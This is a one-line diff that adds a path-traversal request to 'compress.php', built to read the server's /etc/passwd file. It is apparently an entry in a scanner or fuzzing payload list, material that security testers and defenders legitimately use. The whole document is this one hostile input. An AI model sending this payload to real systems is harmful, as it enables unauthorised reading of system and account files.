@@ -1,0 +1,1 @@
+/compress.php?file=../../../../../../../etc/passwd
